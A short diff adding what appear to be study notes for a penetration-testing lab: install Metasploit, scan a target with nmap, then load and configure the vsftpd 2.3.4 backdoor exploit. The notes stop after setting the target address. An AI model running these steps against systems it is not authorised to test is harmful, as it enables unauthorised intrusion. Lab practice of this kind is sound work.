@@ -1,0 +1,17 @@
+#to download
+sudo apt install metasploit-framework
+
+ifconfig
+
+nmap -T4 -A <target_ip>
+
+msfconsole
+
+search vsftpd 2.3.4
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+show options
+
+set rhosts <ip>
+ 
